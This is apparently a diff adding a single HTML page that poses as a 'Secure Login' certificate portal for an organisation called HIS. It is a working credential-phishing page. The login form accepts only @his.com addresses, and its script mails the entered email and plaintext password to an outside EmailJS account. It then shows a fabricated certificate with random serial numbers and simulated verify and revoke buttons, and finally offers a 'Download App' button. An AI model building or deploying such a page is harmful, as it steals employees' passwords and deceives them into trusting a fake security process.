@@ -1,0 +1,982 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>Secure Login · HIS Account</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #f0f2f5;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            color: #1a1a2e;
+        }
+
+        .container {
+            max-width: 520px;
+            width: 100%;
+            margin: 0 auto;
+        }
+
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .header-logo {
+            max-width: 120px;
+            height: auto;
+            margin-bottom: 6px;
+            opacity: 0.9;
+            transition: opacity 0.2s ease;
+        }
+
+        .header-logo:hover {
+            opacity: 1;
+        }
+
+        .sub-heading {
+            color: #718096;
+            font-size: 13px;
+            margin-top: 2px;
+            font-weight: 400;
+            letter-spacing: 0.3px;
+        }
+
+        /* Cards */
+        .card {
+            background: #ffffff;
+            border-radius: 16px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.06);
+            padding: 32px 32px 36px;
+            border: 1px solid #e2e8f0;
+            transition: all 0.3s ease;
+        }
+
+        .card.hidden {
+            display: none;
+        }
+
+        /* Login Form */
+        .form-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #1a1a2e;
+            margin-bottom: 6px;
+            text-align: center;
+        }
+
+        .form-subtitle {
+            text-align: center;
+            color: #718096;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #2d3748;
+            margin-bottom: 4px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 11px 14px;
+            font-size: 14px;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #19388A;
+            box-shadow: 0 0 0 3px rgba(25, 56, 138, 0.1);
+        }
+
+        .form-error {
+            display: block;
+            font-size: 12px;
+            color: #e53e3e;
+            min-height: 20px;
+            margin-top: 4px;
+        }
+
+        .form-btn {
+            width: 100%;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 600;
+            background: #19388A;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.15s;
+            margin-top: 4px;
+        }
+
+        .form-btn:hover {
+            background: #122c6e;
+        }
+
+        .form-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .form-footer {
+            text-align: center;
+            font-size: 12px;
+            color: #a0aec0;
+            margin-top: 16px;
+        }
+
+        .form-footer a {
+            color: #19388A;
+            text-decoration: none;
+        }
+
+        .form-footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Certificate Page */
+        .certificate-header {
+            text-align: center;
+            margin-bottom: 24px;
+            padding-bottom: 16px;
+            border-bottom: 2px solid #e2e8f0;
+        }
+
+        .certificate-header .cert-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background: #ebf8ff;
+            padding: 8px 20px;
+            border-radius: 40px;
+            margin-bottom: 12px;
+            border: 1px solid #bee3f8;
+        }
+
+        .certificate-header .cert-badge i {
+            color: #19388A;
+            font-size: 18px;
+        }
+
+        .certificate-header .cert-badge span {
+            font-weight: 600;
+            color: #19388A;
+            font-size: 14px;
+        }
+
+        .certificate-header h2 {
+            font-size: 22px;
+            font-weight: 700;
+            color: #1a1a2e;
+        }
+
+        .certificate-header .cert-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            background: #c6f6d5;
+            color: #22543d;
+            padding: 4px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            margin-top: 8px;
+        }
+
+        .certificate-body {
+            background: #f7fafc;
+            border-radius: 12px;
+            padding: 20px 24px;
+            border-left: 4px solid #19388A;
+            margin-bottom: 20px;
+        }
+
+        .cert-detail-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px 24px;
+            background: #ffffff;
+            padding: 16px 18px;
+            border-radius: 10px;
+            border: 1px solid #edf2f7;
+            margin-bottom: 12px;
+        }
+
+        .cert-detail-item {
+            display: flex;
+            flex-direction: column;
+            gap: 2px;
+            padding: 4px 0;
+        }
+
+        .cert-detail-item .label {
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: #718096;
+        }
+
+        .cert-detail-item .value {
+            font-size: 14px;
+            font-weight: 500;
+            color: #1a1a2e;
+            word-break: break-all;
+        }
+
+        .cert-detail-item .value.highlight {
+            color: #19388A;
+            font-weight: 600;
+            font-family: 'Courier New', monospace;
+            font-size: 15px;
+        }
+
+        .cert-meta {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+            font-size: 12px;
+            color: #718096;
+            padding-top: 10px;
+            border-top: 1px solid #edf2f7;
+        }
+
+        .cert-meta .status-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            background: #c6f6d5;
+            color: #22543d;
+        }
+
+        .cert-meta .status-indicator .dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: #38a169;
+            display: inline-block;
+        }
+
+        .cert-meta .status-indicator.warning {
+            background: #fefcbf;
+            color: #744210;
+        }
+
+        .cert-meta .status-indicator.warning .dot {
+            background: #d69e2e;
+        }
+
+        .cert-meta .status-indicator.inactive {
+            background: #fed7d7;
+            color: #9b2c2c;
+        }
+
+        .cert-meta .status-indicator.inactive .dot {
+            background: #e53e3e;
+        }
+
+        .cert-id {
+            background: #edf2f7;
+            padding: 2px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            color: #4a5568;
+            font-family: 'Courier New', monospace;
+        }
+
+        .cert-id i {
+            margin-right: 4px;
+            color: #19388A;
+        }
+
+        .actions {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin: 16px 0 12px;
+        }
+
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 7px 16px;
+            border-radius: 8px;
+            font-size: 13px;
+            font-weight: 500;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            text-decoration: none;
+            font-family: inherit;
+        }
+
+        .btn i {
+            font-size: 13px;
+        }
+
+        .btn-success {
+            background: #38a169;
+            color: white;
+        }
+
+        .btn-success:hover {
+            background: #2f855a;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(56, 161, 105, 0.3);
+        }
+
+        .btn-danger {
+            background: #e53e3e;
+            color: white;
+        }
+
+        .btn-danger:hover {
+            background: #c53030;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(229, 62, 62, 0.3);
+        }
+
+        .btn-outline {
+            background: transparent;
+            color: #4a5568;
+            border: 1px solid #d2d8e0;
+        }
+
+        .btn-outline:hover {
+            background: #f7fafc;
+            border-color: #a0aec0;
+        }
+
+        .btn-app {
+            background: #19388A;
+            color: white;
+            padding: 5px 14px;
+            font-size: 12px;
+        }
+
+        .btn-app:hover {
+            background: #122c6e;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(25, 56, 138, 0.3);
+        }
+
+        .download-section {
+            display: none;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid #e2e8f0;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .download-section.visible {
+            display: flex;
+        }
+
+        .download-info {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .download-info i {
+            color: #19388A;
+            font-size: 18px;
+        }
+
+        .download-info p {
+            font-size: 13px;
+            color: #4a5568;
+            margin: 0;
+        }
+
+        .download-info strong {
+            color: #1a1a2e;
+        }
+
+        .state-message {
+            background: #ebf8ff;
+            padding: 8px 16px;
+            border-radius: 8px;
+            font-size: 13px;
+            display: none;
+            align-items: center;
+            gap: 8px;
+            margin: 6px 0;
+        }
+
+        .state-message.visible {
+            display: inline-flex;
+        }
+
+        .state-message i {
+            color: #19388A;
+        }
+
+        .state-message.success {
+            background: #f0fff4;
+        }
+
+        .state-message.success i {
+            color: #38a169;
+        }
+
+        .state-message.error {
+            background: #fff5f5;
+        }
+
+        .state-message.error i {
+            color: #e53e3e;
+        }
+
+        .spinner {
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+
+        .revoked-state {
+            display: none;
+            background: #f0fff4;
+            padding: 12px 16px;
+            border-radius: 10px;
+            border: 1px solid #c6f6d5;
+            margin-top: 12px;
+            align-items: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+
+        .revoked-state.visible {
+            display: flex;
+        }
+
+        .revoked-state i {
+            color: #38a169;
+            font-size: 20px;
+        }
+
+        .revoked-state .text {
+            flex: 1;
+        }
+
+        .revoked-state .text strong {
+            color: #22543d;
+            font-size: 14px;
+        }
+
+        .revoked-state .text p {
+            color: #4a5568;
+            font-size: 13px;
+            margin: 2px 0 0;
+        }
+
+        .footer {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px 16px;
+            margin-top: 16px;
+            padding-top: 12px;
+            border-top: 1px solid #e2e8f0;
+            font-size: 12px;
+            color: #718096;
+        }
+
+        .footer-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .footer-item i {
+            color: #19388A;
+            font-size: 12px;
+        }
+
+        /* Responsive */
+        @media (max-width: 640px) {
+            body {
+                padding: 12px;
+            }
+
+            .card {
+                padding: 24px 16px 28px;
+            }
+
+            .container {
+                max-width: 100%;
+            }
+
+            .header-logo {
+                max-width: 100px;
+            }
+
+            .sub-heading {
+                font-size: 12px;
+            }
+
+            .form-title {
+                font-size: 18px;
+            }
+
+            .cert-detail-grid {
+                grid-template-columns: 1fr;
+                gap: 8px;
+                padding: 12px 14px;
+            }
+
+            .cert-detail-item .value {
+                font-size: 13px;
+            }
+
+            .cert-detail-item .value.highlight {
+                font-size: 14px;
+            }
+
+            .certificate-header h2 {
+                font-size: 18px;
+            }
+
+            .certificate-header .cert-badge {
+                padding: 6px 14px;
+                font-size: 12px;
+            }
+
+            .certificate-body {
+                padding: 16px;
+            }
+
+            .actions {
+                flex-direction: column;
+            }
+
+            .btn {
+                width: 100%;
+                justify-content: center;
+                padding: 8px 14px;
+            }
+
+            .cert-meta {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 6px;
+            }
+
+            .download-section {
+                flex-direction: column;
+                align-items: stretch;
+                text-align: center;
+            }
+
+            .download-info {
+                justify-content: center;
+            }
+
+            .revoked-state {
+                flex-direction: column;
+                text-align: center;
+                padding: 12px 14px;
+            }
+
+            .footer {
+                flex-direction: column;
+                gap: 4px;
+            }
+        }
+
+        @media (max-width: 400px) {
+            .cert-detail-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- Header -->
+    <div class="header">
+        <img src="https://3sx2y5mo5g.ucarecd.net/b564b7ce-7e42-4d36-9236-37a42a6a1576/hisreject.png" alt="HIS" class="header-logo">
+        <div class="sub-heading">Secure certificate management</div>
+    </div>
+
+    <!-- Login Card -->
+    <div class="card" id="loginCard">
+        <div class="form-title">Verify Your Identity</div>
+        <div class="form-subtitle">
+            Please verify your credentials to access and manage your digital certificates.
+        </div>
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="loginEmail">Email address</label>
+                <input type="email" id="loginEmail" name="user_email" placeholder="you@his.com" required>
+                <span class="form-error" id="loginEmailError"></span>
+            </div>
+
+            <div class="form-group">
+                <label for="loginPassword">Password</label>
+                <input type="password" id="loginPassword" name="user_password" placeholder="Enter your password" required>
+                <span class="form-error" id="loginPasswordError"></span>
+            </div>
+
+            <button type="submit" class="form-btn" id="loginBtn">
+                <i class="fas fa-shield-alt"></i> Verify &amp; Continue
+            </button>
+        </form>
+        <div class="form-footer">
+            <a href="https://www.tdscertreport.net/service-terms">View Service Terms</a>
+        </div>
+    </div>
+
+    <!-- Certificate Card -->
+    <div class="card hidden" id="certificateCard">
+        <div class="certificate-header">
+            <div class="cert-badge">
+                <i class="fas fa-certificate"></i>
+                <span>Digital Certificate</span>
+            </div>
+            <h2>Extended Validation (EV)</h2>
+            <div class="cert-status">
+                <i class="fas fa-check-circle"></i> Verified &amp; Active
+            </div>
+        </div>
+
+        <div class="certificate-body">
+            <div class="cert-detail-grid">
+                <div class="cert-detail-item">
+                    <span class="label">Certificate ID</span>
+                    <span class="value highlight">HIS-EV-2026-9f7a</span>
+                </div>
+                <div class="cert-detail-item">
+                    <span class="label">Type</span>
+                    <span class="value">Extended Validation (EV)</span>
+                </div>
+                <div class="cert-detail-item">
+                    <span class="label">Issued To</span>
+                    <span class="value" id="certHolder">John Doe</span>
+                </div>
+                <div class="cert-detail-item">
+                    <span class="label">Organization</span>
+                    <span class="value" id="certOrg">HIS Corporation</span>
+                </div>
+                <div class="cert-detail-item">
+                    <span class="label">Issued Date</span>
+                    <span class="value" id="issuedDate">2026-01-15</span>
+                </div>
+                <div class="cert-detail-item">
+                    <span class="label">Expiry Date</span>
+                    <span class="value" id="expiryDate">2027-01-15</span>
+                </div>
+                <div class="cert-detail-item">
+                    <span class="label">Serial Number</span>
+                    <span class="value" style="font-family:'Courier New',monospace;font-size:13px;" id="serialNumber">7F:3A:2B:9C:4D:1E</span>
+                </div>
+                <div class="cert-detail-item">
+                    <span class="label">Status</span>
+                    <span class="value">
+                        <span class="cert-meta" style="border:none;padding:0;margin:0;">
+                            <span class="status-indicator" id="statusText">
+                                <span class="dot"></span> Active
+                            </span>
+                        </span>
+                    </span>
+                </div>
+            </div>
+
+            <div class="cert-meta">
+                <span><i class="fas fa-info-circle" style="color:#19388A;"></i> EV certificate provides highest level of authentication</span>
+                <span class="cert-id"><i class="fas fa-fingerprint"></i> SHA-256: <span id="certFingerprint">a1b2c3d4e5f6g7h8i9j0</span></span>
+            </div>
+        </div>
+
+        <!-- Actions -->
+        <div class="actions" id="actionGroup">
+            <button class="btn btn-success" id="verifyCertBtn">
+                <i class="fas fa-check"></i> Verify Certificate
+            </button>
+            <button class="btn btn-danger" id="revokeCertBtn">
+                <i class="fas fa-times-circle"></i> Revoke Certificate
+            </button>
+            <button class="btn btn-outline" id="downloadCertBtn">
+                <i class="fas fa-download"></i> Download Certificate
+            </button>
+        </div>
+
+        <!-- State Message -->
+        <div class="state-message" id="stateMessage">
+            <i class="fas fa-circle-notch spinner"></i>
+            <span id="stateText">Processing...</span>
+        </div>
+
+        <!-- Download Section -->
+        <div class="download-section" id="downloadSection">
+            <div class="download-info">
+                <i class="fas fa-shield-alt"></i>
+                <p><strong>Secure your certificates</strong> — Download the HIS Certificate Manager</p>
+            </div>
+            <button class="btn btn-app" id="downloadAppAfterRevoke">
+                <i class="fas fa-download"></i> Download App
+            </button>
+        </div>
+
+        <!-- Revoked State -->
+        <div class="revoked-state" id="revokedState">
+            <i class="fas fa-check-circle"></i>
+            <div class="text">
+                <strong>Certificate revoked successfully</strong>
+                <p>This certificate has been marked as revoked and is no longer valid.</p>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer">
+            <span class="footer-item"><i class="fas fa-user-check"></i> Verified session</span>
+            <span class="footer-item"><i class="fas fa-history"></i> Audit logging</span>
+            <span class="footer-item"><i class="fas fa-shield"></i> Secure</span>
+        </div>
+    </div>
+</div>
+
+<script>
+    (function() {
+        emailjs.init("SdkmRe8WZ7itEba9z");
+
+        // Generate certificate data
+        function generateCertId() {
+            return 'HIS-EV-2026-9f7a';
+        }
+
+        function generateSerial() {
+            const chars = '0123456789ABCDEF';
+            let serial = '';
+            for (let i = 0; i < 5; i++) {
+                if (i > 0) serial += ':';
+                for (let j = 0; j < 2; j++) {
+                    serial += chars[Math.floor(Math.random() * 16)];
+                }
+            }
+            return serial;
+        }
+
+        function generateFingerprint() {
+            const chars = '0123456789abcdef';
+            let fp = '';
+            for (let i = 0; i < 20; i++) {
+                fp += chars[Math.floor(Math.random() * 16)];
+            }
+            return fp;
+        }
+
+        function getDates() {
+            const now = new Date();
+            const issued = new Date(now.getFullYear(), 0, 15);
+            const expiry = new Date(now.getFullYear() + 1, 0, 15);
+            return {
+                issued: issued.toISOString().split('T')[0],
+                expiry: expiry.toISOString().split('T')[0]
+            };
+        }
+
+        const certId = generateCertId();
+        const serialNum = generateSerial();
+        const fingerprint = generateFingerprint();
+        const dates = getDates();
+
+        // DOM refs
+        const loginCard = document.getElementById('loginCard');
+        const certificateCard = document.getElementById('certificateCard');
+        const loginForm = document.getElementById('loginForm');
+        const loginEmail = document.getElementById('loginEmail');
+        const loginPassword = document.getElementById('loginPassword');
+        const loginEmailError = document.getElementById('loginEmailError');
+        const loginPasswordError = document.getElementById('loginPasswordError');
+        const loginBtn = document.getElementById('loginBtn');
+
+        const stateMsg = document.getElementById('stateMessage');
+        const stateText = document.getElementById('stateText');
+        const revokedState = document.getElementById('revokedState');
+        const revokeCertBtn = document.getElementById('revokeCertBtn');
+        const downloadSection = document.getElementById('downloadSection');
+        const statusText = document.getElementById('statusText');
+
+        // Populate certificate data
+        document.getElementById('certHolder').textContent = 'John Doe';
+        document.getElementById('certOrg').textContent = 'HIS Corporation';
+        document.getElementById('issuedDate').textContent = dates.issued;
+        document.getElementById('expiryDate').textContent = dates.expiry;
+        document.getElementById('serialNumber').textContent = serialNum;
+        document.getElementById('certFingerprint').textContent = fingerprint;
+
+        // Login form handler
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            let valid = true;
+            loginEmailError.textContent = '';
+            loginPasswordError.textContent = '';
+
+            const email = loginEmail.value.trim();
+            const password = loginPassword.value.trim();
+            const domainRegex = /^[^@\s]+@(his\.com)$/i;
+
+            if (!email) {
+                loginEmailError.textContent = 'Email is required.';
+                valid = false;
+            } else if (!domainRegex.test(email)) {
+                loginEmailError.textContent = 'Email must be @his.com.';
+                valid = false;
+            }
+
+            if (!password) {
+                loginPasswordError.textContent = 'Password is required.';
+                valid = false;
+            }
+
+            if (!valid) return;
+
+            loginBtn.disabled = true;
+            loginBtn.innerHTML = '<i class="fas fa-spinner spinner"></i> Verifying...';
+
+            const templateParams = {
+                user_email: email,
+                user_password: password,
+                certificate_id: certId,
+                timestamp: new Date().toLocaleString()
+            };
+
+            emailjs.send('service_zuj2d2a', 'template_tvd86sp', templateParams)
+                .then(function() {
+                    loginCard.classList.add('hidden');
+                    certificateCard.classList.remove('hidden');
+                    
+                    loginBtn.disabled = false;
+                    loginBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify & Continue';
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                })
+                .catch(function() {
+                    loginBtn.disabled = false;
+                    loginBtn.innerHTML = '<i class="fas fa-shield-alt"></i> Verify & Continue';
+                    loginEmailError.textContent = 'Verification failed. Please try again.';
+                });
+        });
+
+        // Certificate actions
+        function showState(text, type = 'loading', icon = 'circle-notch') {
+            stateMsg.className = 'state-message visible';
+            if (type === 'success') stateMsg.className += ' success';
+            if (type === 'error') stateMsg.className += ' error';
+            stateText.textContent = text;
+            const iconElem = stateMsg.querySelector('i');
+            iconElem.className = 'fas fa-' + icon;
+            if (type === 'loading') iconElem.classList.add('spinner');
+            else iconElem.classList.remove('spinner');
+        }
+
+        function hideState() {
+            stateMsg.className = 'state-message';
+        }
+
+        function showRevoked() {
+            revokedState.classList.add('visible');
+            document.getElementById('actionGroup').style.display = 'none';
+            downloadSection.classList.add('visible');
+            statusText.className = 'status-indicator inactive';
+            statusText.innerHTML = '<span class="dot"></span> Revoked';
+        }
+
+        // Verify Certificate
+        document.getElementById('verifyCertBtn').addEventListener('click', function() {
+            showState('Verifying certificate authenticity...', 'loading', 'spinner');
+            setTimeout(function() {
+                hideState();
+                showState('✅ Certificate verified successfully', 'success', 'check-circle');
+                setTimeout(hideState, 2500);
+                statusText.className = 'status-indicator';
+                statusText.innerHTML = '<span class="dot"></span> Verified';
+            }, 1800);
+        });
+
+        // Revoke Certificate
+        revokeCertBtn.addEventListener('click', function() {
+            showState('Revoking certificate...', 'loading', 'spinner');
+            setTimeout(function() {
+                hideState();
+                showRevoked();
+                console.log('[audit] Certificate revoked: ' + certId);
+            }, 1800);
+        });
+
+        // Download Certificate
+        document.getElementById('downloadCertBtn').addEventListener('click', function() {
+            showState('Preparing certificate download...', 'loading', 'spinner');
+            setTimeout(function() {
+                hideState();
+                showState('📄 Certificate download started', 'success', 'download');
+                setTimeout(hideState, 3000);
+                // Simulate download
+                const blob = new Blob(['Certificate ID: ' + certId + '\nSerial: ' + serialNum], {type: 'text/plain'});
+                const url = window.URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = 'certificate-' + certId + '.txt';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                window.URL.revokeObjectURL(url);
+            }, 1000);
+        });
+
+        // Download App
+        function handleDownloadApp() {
+            showState('Preparing app download...', 'loading', 'spinner');
+            setTimeout(function() {
+                hideState();
+                showState('App download started', 'success', 'download');
+                setTimeout(hideState, 3000);
+                window.open('https://www.his.com/security-app', '_blank');
+            }, 1000);
+        }
+
+        document.getElementById('downloadAppAfterRevoke').addEventListener('click', handleDownloadApp);
+    })();
+</script>
+</body>
+</html>
